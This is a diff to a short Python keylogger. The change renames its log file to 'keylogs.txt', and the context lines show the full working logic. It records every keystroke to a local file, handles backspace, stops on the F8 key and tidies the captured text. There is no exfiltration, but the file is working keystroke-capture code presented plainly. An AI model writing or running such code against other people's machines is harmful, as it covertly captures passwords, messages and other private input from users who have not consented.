@@ -6,20 +6,20 @@ import os
 log_dir = ""
 
 
-logging.basicConfig(filename=(log_dir + "hashkeyss.txt"), \
+logging.basicConfig(filename=(log_dir + "keylogs.txt"), \
 	level=logging.DEBUG, format='%(message)s')
 
 def on_press(key):
     logging.info(str(key))
     if key == keyboard.Key.backspace:
-        with open('hashkeyss.txt', 'rb+') as f:
+        with open('keylogs.txt', 'rb+') as f:
             f.read()
             f.seek(-20, os.SEEK_END)
             f.truncate()
 
 def on_release(key):
     if key == keyboard.Key.f8:
-        with open('hashkeyss.txt', 'rb+') as f,open('hashkeyss.txt', 'r+') as w:
+        with open('keylogs.txt', 'rb+') as f,open('keylogs.txt', 'r+') as w:
             f.read()
             f.seek(-8, os.SEEK_END)
             f.truncate()
@@ -28,9 +28,9 @@ def on_release(key):
 with Listener(on_press=on_press,on_release=on_release) as listener:
     listener.join()
 
-with open('hashkeyss.txt', 'r') as f:
+with open('keylogs.txt', 'r') as f:
     lines = f.readlines()
-with open('hashkeyss.txt', 'w') as f:
+with open('keylogs.txt', 'w') as f:
     for line in lines:
         line=line.replace("\n","")
         line=line.replace("Key.space"," ")
